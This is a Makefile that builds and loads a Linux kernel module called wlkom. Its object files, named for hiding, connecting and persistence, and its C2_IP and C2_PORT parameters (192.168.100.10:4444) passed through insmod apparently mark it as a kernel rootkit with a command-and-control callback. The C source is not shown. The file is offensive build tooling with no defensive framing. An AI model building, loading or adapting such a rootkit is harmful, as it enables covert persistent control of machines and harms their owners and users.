CC      ?= gcc
CFLAGS  = -std=c99 -pedantic -Wall -Wextra
LDLIBS  =

obj-m += wlkom.o
wlkom-objs := src/main.o src/hide.o src/connect.o src/persist.o

ccflags-y += -Wno-declaration-after-statement \
	-I$(PWD)/include

KDIR := /lib/modules/$(shell uname -r)/build
PWD  := $(shell pwd)

C2_IP   ?= 192.168.100.10
C2_PORT ?= 4444

.PHONY: all clean load unload

all:
	@if [ ! -d "$(KDIR)" ]; then \
		echo "ERROR: Kernel headers not found at $(KDIR)"; \
		echo "Arch:   sudo pacman -S linux-headers"; \
		echo "Debian: sudo apt install linux-headers-$$(uname -r)"; \
		exit 1; \
	fi
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean

load:
	sudo insmod wlkom.ko c2_ip="$(C2_IP)" c2_port=$(C2_PORT)

unload:
	sudo rmmod wlkom

test-load: load
	sleep 2
	sudo dmesg | tail -20 | grep WLKOM
	sudo make unload

